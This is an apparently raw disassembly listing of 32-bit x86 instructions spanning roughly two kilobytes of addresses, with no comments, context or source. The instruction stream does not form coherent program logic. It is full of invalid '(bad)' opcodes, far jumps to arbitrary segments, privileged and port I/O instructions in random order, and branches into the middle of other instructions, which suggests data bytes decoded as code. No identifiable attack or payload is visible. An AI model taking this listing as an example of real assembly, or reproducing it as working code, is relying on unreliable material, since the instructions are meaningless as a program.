  420a49:	and    DWORD PTR [edx],esp
  420a4b:	jmp    0x4b86:0x11d91ed2
  420a52:	sbb    BYTE PTR [ebx+0x59],0x9a
  420a56:	call   0x47e77951
  420a5b:	and    DWORD PTR [esi+0x6a9e98af],ebx
  420a61:	cmp    BYTE PTR [edi+0x2c],bl
  420a64:	cmp    ecx,esi
  420a66:	mov    ds:0xe1312d40,al
  420a6b:	mov    DWORD PTR [edi],esp
  420a6d:	mov    ch,0x30
  420a6f:	(bad)  
  420a70:	cmc    
  420a71:	cmp    eax,0x5dd96bd0
  420a76:	jmp    0x420a20
  420a78:	push   ss
  420a79:	imul   esi,DWORD PTR [edx-0x7e],0x48
  420a7d:	aas    
  420a7e:	sti    
  420a7f:	xor    dl,BYTE PTR [ecx-0xc7625df]
  420a85:	mov    dh,0x12
  420a87:	int    0x33
  420a89:	sub    eax,0x436da1d4
  420a8e:	xchg   edx,eax
  420a8f:	mov    esi,0xe151d4c4
  420a94:	cmp    ah,BYTE PTR [ebx]
  420a96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420a97:	push   0x4d5a1b11
  420a9c:	push   ss
  420a9d:	enter  0xded6,0x5f
  420aa1:	pop    edi
  420aa2:	out    0x15,eax
  420aa4:	je     0x420a77
  420aa6:	and    ch,cl
  420aa8:	mov    edi,0x1ad6c17f
  420aad:	out    dx,eax
  420aae:	sar    BYTE PTR [edx+0x4df4ef38],cl
  420ab4:	dec    DWORD PTR [esi+0x62]
  420ab7:	inc    ebx
  420ab8:	push   edx
  420ab9:	jp     0x420ad3
  420abb:	xor    cl,dl
  420abd:	aas    
  420abe:	int3   
  420abf:	xor    bh,BYTE PTR [ebx+0x3cfdd51a]
  420ac5:	or     eax,0xb721e96a
  420aca:	neg    BYTE PTR [edi]
  420acc:	add    al,0xde
  420ace:	hlt    
  420acf:	repnz pop edx
  420ad1:	call   0xfd587e84
  420ad6:	or     edi,esp
  420ad8:	add    edx,DWORD PTR [ecx+0x47aa7d1]
  420ade:	sbb    eax,0xead55a83
  420ae3:	mov    bl,bl
  420ae5:	or     ecx,DWORD PTR [ebx]
  420ae7:	sub    al,0x6c
  420ae9:	sbb    al,0x87
  420aeb:	add    ebp,DWORD PTR [ebx]
  420aed:	sub    ebx,DWORD PTR [edx-0x5865c3e0]
  420af3:	pop    es
  420af4:	mov    cl,0x65
  420af6:	(bad)  
  420af7:	loop   0x420b14
  420af9:	inc    edx
  420afa:	jg     0x420b57
  420afc:	enter  0x7f57,0xab
  420b00:	in     al,0x65
  420b02:	(bad)  
  420b04:	xchg   edi,eax
  420b05:	pop    ds
  420b06:	jecxz  0x420afe
  420b08:	pop    ebx
  420b09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420b0a:	xor    eax,0x885f1bf7
  420b0f:	sub    BYTE PTR [ecx],bl
  420b11:	jno    0x420b3c
  420b13:	cmp    al,0xce
  420b15:	(bad)  
  420b16:	mov    edi,?
  420b18:	dec    eax
  420b19:	fst    DWORD PTR [ebx+0x107bfad5]
  420b1f:	test   DWORD PTR [ebp+0x60],ecx
  420b22:	pop    ss
  420b23:	mov    ebx,0xdc1083fc
  420b28:	fwait
  420b29:	jp     0x420ba7
  420b2b:	push   ss
  420b2c:	adc    DWORD PTR [ebx+0xcfc9373],esi
  420b32:	push   cs
  420b33:	rcl    ah,cl
  420b35:	arpl   WORD PTR [ecx+0x23],bx
  420b38:	jecxz  0x420b3d
  420b3a:	and    DWORD PTR [ebp+ebx*2+0x2423a2dd],eax
  420b41:	inc    ecx
  420b42:	adc    ah,BYTE PTR [esi]
  420b44:	fdiv   QWORD PTR [esi+0x468167b0]
  420b4a:	or     edx,DWORD PTR [ebp+0x59ecb91c]
  420b50:	stc    
  420b51:	mov    ds:0x7acb581a,al
  420b56:	pop    ecx
  420b57:	xchg   esp,eax
  420b58:	call   0x237be888
  420b5d:	push   ebp
  420b5e:	xchg   BYTE PTR [edi],cl
  420b60:	pop    dx
  420b62:	rcl    eax,cl
  420b64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420b65:	ds mov bl,0xb7
  420b68:	fild   DWORD PTR [edi*1+0x5e3cf79d]
  420b6f:	adc    BYTE PTR [edi+edi*2],bl
  420b72:	ins    BYTE PTR es:[edi],dx
  420b73:	mov    dl,0x6
  420b75:	or     eax,0xd625407a
  420b7a:	pop    es
  420b7b:	mov    ebx,0x59d8a163
  420b80:	aad    0x26
  420b82:	std    
  420b83:	sti    
  420b84:	mov    dl,0xc4
  420b86:	(bad)  
  420b87:	jmp    0x46fdcb03
  420b8c:	adc    BYTE PTR [ebx-0x6a23e339],ah
  420b92:	lods   eax,DWORD PTR ds:[esi]
  420b93:	int3   
  420b94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420b95:	ficom  DWORD PTR [edx]
  420b97:	int    0xef
  420b99:	sbb    al,0xa8
  420b9b:	lods   eax,DWORD PTR ds:[esi]
  420b9c:	push   ds
  420b9d:	mov    al,0xf1
  420b9f:	adc    ebx,0x95624018
  420ba5:	pop    edi
  420ba6:	push   edx
  420ba7:	mov    esp,0xf190bf13
  420bac:	icebp  
  420bad:	fstp   QWORD PTR [esi-0x7e]
  420bb0:	sbb    ebp,DWORD PTR [edx+0x53e5575]
  420bb6:	lahf   
  420bb7:	adc    dl,BYTE PTR [ecx]
  420bb9:	jl     0x420bf3
  420bbb:	ret    0x88df
  420bbe:	mov    edx,0x1b786009
  420bc3:	aad    0x32
  420bc5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420bc6:	or     al,0x68
  420bc8:	push   edi
  420bc9:	scas   eax,DWORD PTR es:[edi]
  420bca:	xor    BYTE PTR [edx-0x37374a8],al
  420bd0:	push   cs
  420bd1:	jns    0x420bae
  420bd3:	mov    ecx,0xdc49a20d
  420bd8:	shl    DWORD PTR [ebx-0x3b4da795],0xf6
  420bdf:	fst    QWORD PTR [edx+0x34]
  420be2:	imul   edx,ebp,0x7424ddad
  420be8:	bound  ebp,QWORD PTR [ebx+0x19b38045]
  420bee:	inc    edx
  420bef:	dec    eax
  420bf0:	pop    edx
  420bf1:	mov    dl,0xf7
  420bf3:	pop    esp
  420bf4:	dec    esp
  420bf5:	loopne 0x420b92
  420bf7:	xchg   edi,eax
  420bf8:	push   esi
  420bf9:	mov    esi,ebx
  420bfb:	xchg   ebx,eax
  420bfc:	and    al,0x5
  420bfe:	mov    al,ds:0x3ddc7612
  420c03:	out    dx,eax
  420c04:	inc    eax
  420c05:	inc    edi
  420c06:	mov    ecx,0x8ad0ed81
  420c0b:	pop    ds
  420c0c:	inc    ebp
  420c0d:	lea    edi,[edx-0x26078610]
  420c13:	int3   
  420c14:	or     bl,BYTE PTR [ebx+0x7c4b7395]
  420c1a:	aaa    
  420c1b:	pop    edx
  420c1c:	and    esi,esi
  420c1e:	sbb    al,0xe1
  420c20:	and    al,0x85
  420c22:	cmp    al,0x8
  420c24:	jp     0x420c1c
  420c26:	sbb    ecx,DWORD PTR [ebx]
  420c28:	stc    
  420c29:	fcom   DWORD PTR [eax-0x7048f6ea]
  420c2f:	inc    eax
  420c30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420c31:	fs mov ecx,0xeb48c40e
  420c37:	nop
  420c38:	call   0xbb96:0x9e96868a
  420c3f:	sbb    ebp,ebx
  420c41:	push   ecx
  420c42:	ror    BYTE PTR [ebx-0x3a4839c8],0x32
  420c49:	pusha  
  420c4a:	mov    DWORD PTR [ebp-0x18],esp
  420c4d:	inc    esi
  420c4e:	repz push ss
  420c50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420c51:	es out 0xe6,al
  420c54:	jbe    0x420cac
  420c56:	xchg   ecx,eax
  420c57:	je     0x420c66
  420c59:	loop   0x420c72
  420c5b:	push   cs
  420c5c:	mov    eax,ds:0xc61991b6
  420c61:	pop    ds
  420c62:	or     bh,BYTE PTR [ebx]
  420c64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420c65:	mov    ebx,DWORD PTR [ebx+0x67f4b127]
  420c6b:	xchg   DWORD PTR [ebx-0x1fd12d82],ebp
  420c71:	xchg   esi,eax
  420c72:	inc    ecx
  420c73:	popf   
  420c74:	jle    0x420c77
  420c76:	xchg   esp,eax
  420c77:	or     al,0x39
  420c79:	add    ax,0xb62e
  420c7d:	inc    eax
  420c7e:	dec    edx
  420c7f:	aas    
  420c80:	mov    dh,ah
  420c82:	push   esp
  420c83:	rcr    esi,1
  420c85:	(bad)  
  420c87:	gs (bad) 
  420c89:	ficom  WORD PTR [ebp-0x35bb344]
  420c8f:	test   al,0xc5
  420c91:	addr16 push esp
  420c93:	adc    DWORD PTR [esi+0x51],ecx
  420c96:	call   0xe187:0x5599a8ec
  420c9d:	push   ebx
  420c9e:	sub    DWORD PTR [eax+ecx*2+0x4a],edi
  420ca2:	pop    eax
  420ca3:	mov    cs,WORD PTR [eax-0x117c3914]
  420ca9:	mov    eax,ds:0xd3e88752
  420cae:	xchg   esi,eax
  420caf:	push   ebx
  420cb0:	or     bl,bh
  420cb2:	push   ebp
  420cb3:	push   ecx
  420cb4:	call   0xa12:0x8110cb9d
  420cbb:	xor    ch,0x96
  420cbe:	call   0xe833442f
  420cc3:	push   ebx
  420cc4:	sub    ebp,esp
  420cc6:	pop    ss
  420cc7:	popa   
  420cc8:	aam    0x1f
  420cca:	popf   
  420ccb:	arpl   WORD PTR [ecx+0x2e277628],bp
  420cd1:	push   esi
  420cd2:	add    al,0xa6
  420cd4:	fwait
  420cd5:	imul   BYTE PTR [ecx+edi*2]
  420cd8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420cd9:	cmp    al,0xc3
  420cdb:	push   esi
  420cdc:	jmp    0x420ca9
  420cde:	and    DWORD PTR [eax+ecx*8-0x4f],0x6
  420ce3:	inc    ebx
  420ce4:	cmp    edx,DWORD PTR [edx-0x73]
  420ce7:	popa   
  420ce8:	and    dh,BYTE PTR [eax+0x28350910]
  420cee:	fiadd  WORD PTR [eax]
  420cf0:	pop    ebx
  420cf1:	mov    edi,0xde33df19
  420cf6:	je     0x420d64
  420cf8:	adc    al,0x5c
  420cfa:	mov    ecx,0xf2a14032
  420cff:	inc    esp
  420d00:	iret   
  420d01:	dec    DWORD PTR [esi]
  420d03:	pop    ecx
  420d04:	repnz ficom DWORD PTR [ebx]
  420d07:	mov    esi,0xe03765c1
  420d0c:	outs   dx,BYTE PTR ds:[esi]
  420d0d:	mov    WORD PTR [esi-0x50b3239c],cs
  420d13:	sbb    al,0x56
  420d15:	repz dec ebp
  420d17:	jle    0x420ce2
  420d19:	adc    ebp,DWORD PTR ds:0x814b7126
  420d1f:	cdq    
  420d20:	and    DWORD PTR [edi-0x34f24cc9],0xce8bccef
  420d2a:	inc    esi
  420d2b:	out    dx,eax
  420d2c:	mov    bl,0x38
  420d2e:	std    
  420d2f:	fs sub eax,0xf2c27403
  420d35:	mov    esi,0xf3fb9d80
  420d3a:	jmp    0x420cf8
  420d3c:	mov    ds:0x5e85c459,ax
  420d42:	jle    0x420d99
  420d44:	stos   BYTE PTR es:[edi],al
  420d45:	jmp    0xbb5c:0x268a6b5f
  420d4c:	mov    edx,0x2370628c
  420d51:	sbb    bh,dl
  420d53:	cmp    edi,DWORD PTR [edi+0x24]
  420d56:	sbb    BYTE PTR [ebp-0x2d],cl
  420d59:	mov    al,ds:0xd75fc531
  420d5e:	repnz adc eax,0xf4aae56a
  420d64:	fiadd  DWORD PTR [ebx-0x60e09f82]
  420d6a:	scas   al,BYTE PTR es:[edi]
  420d6b:	mov    edi,?
  420d6d:	mov    WORD PTR [eax],ss
  420d6f:	xchg   esp,eax
  420d70:	call   0xf636a8f5
  420d75:	stos   DWORD PTR es:[edi],eax
  420d76:	cli    
  420d77:	aaa    
  420d78:	call   0xf51fa7d
  420d7d:	pop    edx
  420d7e:	dec    esp
  420d7f:	push   edx
  420d80:	sbb    BYTE PTR [ebx+ecx*4-0x48],0x6a
  420d85:	sbb    DWORD PTR [ecx],edi
  420d87:	fld    TBYTE PTR [edx-0x6e1a395]
  420d8d:	sub    edi,DWORD PTR [eax]
  420d8f:	lds    esp,FWORD PTR [ebp-0x7a]
  420d92:	test   eax,0xe6b03aa4
  420d97:	xor    bh,BYTE PTR [edx]
  420d99:	mov    eax,0x598a080c
  420d9e:	add    edx,DWORD PTR [edx+0x67]
  420da1:	out    dx,al
  420da2:	fisttp QWORD PTR [edi+0x475b4dff]
  420da8:	adc    BYTE PTR [edx-0x52bfcf5f],bl
  420dae:	jb     0x420e0a
  420db0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420db1:	fdivp  st(6),st
  420db3:	push   0x32a5bb7e
  420db8:	(bad)  
  420dba:	push   edx
  420dbb:	js     0x420e21
  420dbd:	or     ch,cl
  420dbf:	call   0x8504df28
  420dc4:	sti    
  420dc5:	jo     0x420d90
  420dc7:	xor    al,0x6b
  420dc9:	inc    edx
  420dca:	loop   0x420d50
  420dcc:	mov    eax,DWORD PTR [ecx-0x59]
  420dcf:	dec    esp
  420dd0:	sub    esp,DWORD PTR [ebx-0x5d6220eb]
  420dd6:	sub    al,0x83
  420dd8:	mov    edx,0x9f588068
  420ddd:	mov    al,ds:0xd8e3db3a
  420de2:	pop    esi
  420de3:	sub    BYTE PTR [eax],dh
  420de5:	jmp    edx
  420de7:	xchg   BYTE PTR ds:[edi+0x21811d4],dh
  420dee:	push   eax
  420def:	retf   0x30f1
  420df2:	or     dh,BYTE PTR [eax-0x68]
  420df5:	dec    ebp
  420df7:	(bad)  
  420df8:	jle    0x420dcd
  420dfa:	dec    ebp
  420dfb:	rcr    DWORD PTR [eiz*8+0x5cd5c30e],0x47
  420e03:	aaa    
  420e04:	jns    0x420e7a
  420e06:	push   edx
  420e07:	dec    ebx
  420e08:	test   al,0xa0
  420e0a:	xchg   esp,eax
  420e0b:	(bad)  
  420e0c:	stc    
  420e0d:	mov    eax,0xf53e1855
  420e12:	icebp  
  420e13:	xor    DWORD PTR [ebx],ecx
  420e15:	mov    bh,0x5f
  420e17:	adc    esp,0xffffffb3
  420e1a:	cdq    
  420e1b:	adc    al,0x3e
  420e1d:	xor    eax,0xc99b839d
  420e22:	iret   
  420e23:	imul   eax,ecx,0xd6fca9e4
  420e29:	mov    al,ds:0x383e7f8b
  420e2e:	test   BYTE PTR [ebp-0x17],dh
  420e31:	dec    edi
  420e32:	mov    bh,dl
  420e34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420e35:	out    0x19,al
  420e37:	shr    esi,cl
  420e39:	jbe    0x420e0f
  420e3b:	mov    ecx,0x94fde873
  420e40:	in     al,dx
  420e41:	mov    edi,0xf2830785
  420e46:	or     DWORD PTR [ebx],0xffffffb7
  420e49:	add    BYTE PTR [esi],ah
  420e4b:	mov    edi,DWORD PTR [edx-0x4fb06945]
  420e51:	outs   dx,DWORD PTR ds:[esi]
  420e52:	rcl    dh,1
  420e54:	and    ecx,esp
  420e56:	lahf   
  420e57:	dec    esi
  420e58:	jo     0x420e9e
  420e5a:	xor    edx,DWORD PTR [ecx-0x17]
  420e5d:	sub    DWORD PTR [ebx-0x61160023],0xffffff84
  420e64:	aam    0x97
  420e66:	and    DWORD PTR [edi-0x15],esi
  420e69:	pushf  
  420e6a:	xchg   edx,eax
  420e6b:	lea    edx,[edi-0x51]
  420e6e:	in     al,dx
  420e6f:	sub    eax,DWORD PTR [ecx-0x57f109bc]
  420e75:	aad    0xe4
  420e77:	fld    DWORD PTR [ecx]
  420e79:	shl    DWORD PTR [edx+0x69222da4],cl
  420e7f:	adc    eax,0x233ff024
  420e84:	fild   DWORD PTR [ebx-0x9]
  420e87:	aas    
  420e88:	and    al,cl
  420e8a:	add    ecx,DWORD PTR [edi]
  420e8c:	stos   BYTE PTR es:[edi],al
  420e8d:	pop    edx
  420e8e:	ret    0xb832
  420e91:	sahf   
  420e92:	fwait
  420e93:	jae    0x420e4d
  420e95:	inc    esp
  420e96:	sbb    BYTE PTR ds:0x80909ef0,dh
  420e9c:	neg    BYTE PTR [eax+0x676ef7a2]
  420ea2:	je     0x420e70
  420ea4:	pusha  
  420ea5:	xor    eax,0xafb56c5b
  420eaa:	leave  
  420eab:	repz sub eax,0x7d5df06a
  420eb1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420eb2:	adc    eax,0xb9564317
  420eb7:	inc    esp
  420eb8:	pavgb  mm4,QWORD PTR [eax+ebx*4-0x73]
  420ebd:	nop
  420ebe:	mov    eax,ds:0xc990bbf7
  420ec3:	enter  0x9203,0xde
  420ec7:	pushf  
  420ec8:	fsubr  st,st(4)
  420eca:	pop    ebx
  420ecb:	sbb    eax,0xff5ecc73
  420ed0:	repz or DWORD PTR [edx+0x15],esi
  420ed4:	je     0x420e89
  420ed6:	jae    0x420ede
  420ed8:	inc    edi
  420ed9:	jae    0x420ed4
  420edb:	jno    0x420e96
  420edd:	inc    ebx
  420ede:	adc    ah,BYTE PTR [esi-0x1954a9f]
  420ee4:	mov    dl,0x8b
  420ee6:	xor    esi,DWORD PTR [edx-0x1aacbdfa]
  420eec:	or     DWORD PTR [ebx+0x1898e071],0xfc9297dc
  420ef6:	add    DWORD PTR [edi],ecx
  420ef8:	pop    ds
  420ef9:	mov    ecx,0xe432aedf
  420efe:	outs   dx,BYTE PTR ds:[esi]
  420eff:	fldenv [esi+0x46d0fe8d]
  420f05:	out    dx,eax
  420f06:	gs push ebp
  420f08:	out    0x2,al
  420f0a:	lock mov ah,0xc1
  420f0d:	shl    BYTE PTR [ebx+ebp*8],0xa6
  420f11:	or     eax,0x4351e64
  420f16:	jle    0x420efa
  420f18:	mov    ds:0x42ced60c,eax
  420f1d:	or     DWORD PTR [edi],eax
  420f1f:	div    DWORD PTR [ebx+0xb]
  420f22:	adc    cl,BYTE PTR [ebx-0x5d999cb0]
  420f28:	pop    eax
  420f29:	mov    ecx,0x77040bf
  420f2e:	push   0xffffff84
  420f30:	inc    edi
  420f31:	xchg   edi,eax
  420f32:	push   DWORD PTR [esi-0x3fe21758]
  420f38:	mov    ah,0x2
  420f3a:	cwde   
  420f3b:	cmp    esi,ecx
  420f3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420f3e:	jbe    0x420f5a
  420f40:	sbb    al,cl
  420f42:	loopne 0x420f02
  420f44:	lock stos DWORD PTR es:[edi],eax
  420f46:	ins    BYTE PTR es:[edi],dx
  420f47:	outs   dx,DWORD PTR ds:[esi]
  420f48:	test   bh,bh
  420f4a:	stos   BYTE PTR es:[edi],al
  420f4b:	test   al,0x9e
  420f4d:	add    cl,BYTE PTR [edi-0x5933c113]
  420f53:	bound  edx,QWORD PTR [edi+0x20cd61cb]
  420f59:	dec    esi
  420f5a:	hlt    
  420f5b:	push   ss
  420f5c:	mov    ch,0xd3
  420f5e:	xor    eax,0x53991e4c
  420f63:	mov    eax,0x9be7d3b5
  420f68:	(bad)  
  420f69:	inc    ebp
  420f6a:	in     eax,dx
  420f6b:	not    BYTE PTR [ecx-0x42c40dcf]
  420f71:	repz inc ebp
  420f73:	jle    0x420f1c
  420f75:	jmp    0xd750:0x57ea5868
  420f7c:	jl     0x420fb9
  420f7e:	retf   0x712e
  420f81:	or     al,dh
  420f83:	sub    ch,bh
  420f85:	mov    dl,0xfd
  420f87:	pop    esp
  420f88:	in     al,0x8d
  420f8a:	dec    edi
  420f8b:	sbb    edx,DWORD PTR [edx-0x1edc11f0]
  420f91:	push   eax
  420f92:	xchg   edx,eax
  420f93:	cmp    DWORD PTR [ebp-0x2d],0xffffff95
  420f97:	cmp    BYTE PTR [eax+0x46],bl
  420f9a:	nop
  420f9b:	call   0xaf7e6f76
  420fa0:	and    DWORD PTR [ecx],edi
  420fa2:	cmp    ebp,esi
  420fa4:	pause  
  420fa6:	stc    
  420fa7:	outs   dx,BYTE PTR ds:[esi]
  420fa8:	sub    al,0x98
  420faa:	outs   dx,BYTE PTR ds:[esi]
  420fab:	psubq  mm4,QWORD PTR [ebx+0x7e]
  420faf:	repz pushf 
  420fb1:	dec    ebp
  420fb2:	loopne 0x420f5d
  420fb4:	idiv   BYTE PTR [edi+ecx*8]
  420fb7:	mov    dl,dl
  420fb9:	inc    ebp
  420fba:	and    DWORD PTR [ebx-0xc],ebx
  420fbd:	mov    ecx,0x36a802f6
  420fc2:	(bad)  
  420fc3:	or     eax,0xf09ceee4
  420fc8:	add    al,0x41
  420fca:	repnz pop ss
  420fcc:	pop    ebx
  420fcd:	cmp    esi,DWORD PTR [esi+0x3cf4bdb2]
  420fd3:	mov    dl,0x33
  420fd5:	pop    ds
  420fd6:	mov    ebp,DWORD PTR [esi-0x56]
  420fd9:	(bad)  
  420fda:	pop    edx
  420fdb:	stos   DWORD PTR es:[edi],eax
  420fdc:	dec    ebx
  420fdd:	arpl   WORD PTR [ebp+0x4a223fcf],bp
  420fe3:	fmul   DWORD PTR [esi+0x72]
  420fe6:	dec    edx
  420fe7:	add    DWORD PTR [ebp-0x2d],0x52
  420feb:	dec    ebp
  420fec:	mov    ds:0x66862b09,al
  420ff1:	mov    WORD PTR [eax+0x4b],ds
  420ff4:	or     eax,0xf7a1f073
  420ff9:	mov    ecx,DWORD PTR [ebx]
  420ffb:	icebp  
  420ffc:	rcr    BYTE PTR [ebp-0x588f4bdf],cl
  421002:	into   
  421003:	mov    ebx,0x2d022a5
  421008:	fcom   st(4)
  42100a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42100b:	lods   al,BYTE PTR ds:[esi]
  42100c:	test   DWORD PTR [edi+0x21],eax
  42100f:	push   es
  421010:	jnp    0x421017
  421012:	xchg   di,ax
  421014:	nop
  421015:	mov    ecx,0x587d67fe
  42101a:	in     al,dx
  42101b:	call   0x25a9:0x27f1ac22
  421022:	fimul  WORD PTR [ebp+0x40b13376]
  421028:	sahf   
  421029:	dec    ebx
  42102a:	icebp  
  42102b:	mov    esi,0x77b2feda
  421030:	push   ecx
  421031:	push   edx
  421032:	mov    al,0xd0
  421034:	aad    0xd6
  421036:	sbb    al,0xfc
  421038:	cdq    
  421039:	outs   dx,DWORD PTR ds:[esi]
  42103a:	add    DWORD PTR [esi-0x5b],ebp
  42103d:	(bad)  
  42103e:	out    dx,eax
  42103f:	sub    BYTE PTR [eax+0x2bb3dfcf],dl
  421045:	mov    ecx,0x9e90fafb
  42104a:	sub    ecx,DWORD PTR [ebp+0x6bbb89ca]
  421050:	test   eax,0xa21831bd
  421055:	ror    BYTE PTR [ebp+0x6b698e3a],1
  42105b:	cmp    DWORD PTR [ecx+0x0],esi
  42105e:	iret   
  42105f:	pop    ebx
  421060:	(bad)  [ecx]
  421062:	jmp    0xd4446bb0
  421067:	pusha  
  421068:	lahf   
  421069:	or     ch,BYTE PTR [esi+ebp*4]
  42106c:	cli    
  42106d:	push   edi
  42106e:	pop    es
  42106f:	and    edx,DWORD PTR [esp+ebx*8-0x58f68a13]
  421076:	xor    eax,0x624bfae5
  42107b:	pop    edx
  42107c:	in     eax,dx
  42107d:	lds    esp,FWORD PTR [edi-0xf]
  421080:	add    DWORD PTR [eax-0x6b],ebx
  421083:	and    eax,0x258d537a
  421088:	jmp    0xe1e1c2af
  42108d:	stc    
  42108e:	scas   eax,DWORD PTR es:[edi]
  42108f:	cmp    ebx,edi
  421091:	pop    ecx
  421092:	push   esp
  421093:	not    DWORD PTR [ebx+0x5a]
  421096:	xchg   edi,eax
  421097:	xor    edx,DWORD PTR [eax-0x56]
  42109a:	ret    
  42109b:	mov    BYTE PTR [eax+ecx*1-0x6f],bl
  42109f:	out    0x1a,al
  4210a1:	ret    0x9c92
  4210a4:	pop    esi
  4210a5:	jb     0x421045
  4210a7:	(bad)  
  4210a8:	lahf   
  4210a9:	call   0xadb9b216
  4210ae:	cli    
  4210af:	push   0x57
  4210b1:	push   cs
  4210b2:	xor    dl,dl
  4210b4:	das    
  4210b5:	push   edi
  4210b6:	jp     0x4210e2
  4210b8:	adc    bl,BYTE PTR [edi+0x267fa3de]
  4210be:	cmp    DWORD PTR [edi-0x7e],ebx
  4210c1:	(bad)  
  4210c2:	jne    0x421071
  4210c4:	or     al,0x3d
  4210c6:	fistp  DWORD PTR [eax-0x1cccc4ae]
  4210cc:	(bad)  ds:0xc4effb27
  4210d2:	stos   DWORD PTR es:[edi],eax
  4210d3:	xor    BYTE PTR [eax-0x6a7633ca],al
  4210d9:	dec    ebp
  4210da:	and    DWORD PTR [eax],eax
  4210dc:	ja     0x421145
  4210de:	xchg   edx,eax
  4210df:	push   0x1b
  4210e1:	xchg   esi,eax
  4210e2:	dec    edx
  4210e4:	das    
  4210e5:	jp     0x4210eb
  4210e7:	test   DWORD PTR [edi+ebp*8+0x4a],0x6f4d5f6
  4210ef:	in     al,0xfe
  4210f1:	aas    
  4210f2:	adc    al,BYTE PTR [eax+0x1898bafd]
  4210f8:	dec    edi
  4210f9:	and    DWORD PTR [edx-0x37],esp
  4210fc:	out    0xcb,al
  4210fe:	or     BYTE PTR [ebx-0x51c3cda3],ch
  421104:	xchg   ebx,eax
  421105:	mov    bh,BYTE PTR [eax+0x2187165]
  42110b:	fcmovnbe st,st(0)
  42110d:	gs cs dec ebx
  421110:	cmp    al,ch
  421112:	sbb    dh,dl
  421114:	retf   0xc8ea
  421117:	adc    esp,DWORD PTR [ebx]
  421119:	retf   
  42111a:	scas   eax,DWORD PTR es:[edi]
  42111b:	xchg   esp,eax
  42111c:	lods   al,BYTE PTR ds:[esi]
  42111d:	pop    esi
  42111e:	pop    es
  42111f:	ds arpl ax,si
  421122:	jne    0x42111c
  421124:	mov    ch,0x15
  421126:	js     0x421123
  421128:	stos   DWORD PTR es:[edi],eax
  421129:	out    0xb3,al
  42112b:	cmp    DWORD PTR [ecx-0x37],esi
  42112e:	call   0xca832769
  421133:	xchg   BYTE PTR [edi],bl
  421135:	push   ebp
  421136:	or     eax,0xc91c40b5
  42113b:	aas    
  42113c:	dec    edi
  42113d:	or     edx,DWORD PTR ss:[eax+0x4079a23]
  421144:	mov    edx,0xf30647c7
  421149:	push   esp
  42114a:	xlat   BYTE PTR ds:[ebx]
  42114b:	ret    0x6262
  42114e:	push   ds
  42114f:	cs loop 0x42118f
  421152:	or     ebx,ebx
  421154:	mov    ds:0x8e817dc3,eax
  421159:	adc    edi,DWORD PTR [ebx]
  42115b:	mov    ebx,0x221bd26f
  421160:	add    bl,BYTE PTR [edi+edx*4-0x52904669]
  421167:	into   
  421168:	out    0xcf,eax
  42116a:	adc    BYTE PTR [ebx-0x7bba0173],cl
  421170:	mov    edx,0x845f1f18
  421175:	lahf   
  421176:	aaa    
  421177:	loop   0x4211ef
  421179:	not    BYTE PTR [edx]
  42117b:	push   es
  42117c:	sbb    al,0x57
  42117e:	and    esi,ebx
  421180:	retf   
  421181:	test   eax,0x49512d67
  421186:	loope  0x42118e
  421188:	inc    ebp
  421189:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42118a:	mov    cr6,ebx
  42118d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42118e:	mov    dh,BYTE PTR [esi-0x52a79cd0]
  421194:	sbb    BYTE PTR [edi-0x78dbad1e],0x12
  42119b:	aaa    
  42119c:	popf   
  42119d:	add    edi,DWORD PTR [edx+0x223a825]
  4211a3:	cmc    
  4211a4:	ret    
  4211a5:	ret    
  4211a6:	jl     0x421208
  4211a8:	jmp    0xcd2d:0x9d99c78f
  4211af:	sub    edx,edx
  4211b1:	xor    DWORD PTR [esp+eiz*8-0x24e8305c],edx
  4211b8:	les    edx,FWORD PTR [esi-0x57]
  4211bb:	aad    0xed
  4211bd:	xchg   ebx,eax
  4211be:	ins    BYTE PTR es:[edi],dx
  4211bf:	(bad)  
  4211c0:	idiv   edx
  4211c2:	mov    ebp,ebx
  4211c4:	in     eax,0x33
  4211c6:	shr    DWORD PTR [edx-0x3a58f578],0xc5
  4211cd:	xchg   edx,eax
  4211ce:	clc    
  4211cf:	ds and al,cl
  4211d2:	mov    bh,0xea
  4211d4:	add    al,0xba
  4211d6:	xchg   edi,eax
  4211d7:	out    dx,eax
  4211d8:	lds    ecx,FWORD PTR [esi+0x7327eee]
  4211de:	dec    edx
  4211df:	loop   0x4211af
  4211e1:	fidiv  WORD PTR [edi]
  4211e3:	in     al,0x1d
  4211e5:	fiadd  DWORD PTR [esi-0x679f5644]
  4211eb:	push   edi
  4211ec:	bound  ecx,QWORD PTR [ebp+0x6]
  4211ef:	push   edx
  4211f0:	nop
  4211f1:	fidiv  DWORD PTR [esi+0xe]
  4211f4:	adc    al,0x1b
  4211f6:	add    ebp,DWORD PTR [edi+0x4f]
  4211f9:	add    DWORD PTR [eax+0x6c940c40],0xffffff9c
  421200:	and    al,0xc6
  421202:	push   esi
  421203:	ficom  DWORD PTR [ecx-0x2f]
  421206:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421207:	mov    al,0x6b
  421209:	or     edi,DWORD PTR [ecx+0xaee89dc]
  42120f:	mov    BYTE PTR [ecx+eax*1-0x1121561e],ch
  421216:	jbe    0x42124f
  421218:	lds    ecx,FWORD PTR [ecx]
  42121a:	cmp    BYTE PTR [ecx+0x13],ah
  42121d:	dec    edi
  42121e:	mov    ebp,0x7f61146a
  421223:	mov    ecx,0x5581f6c8
  421228:	push   edi
  421229:	stc    
  42122a:	lds    edi,FWORD PTR [ecx+0x1321c93b]
  421230:	into   
  421231:	mov    al,0x1b
  421233:	sub    bl,al
  421235:	pop    esp
  421236:	inc    edi
  421237:	pop    esp
  421238:	add    BYTE PTR [edi+0x11bf4470],0x88
  42123f:	leave  
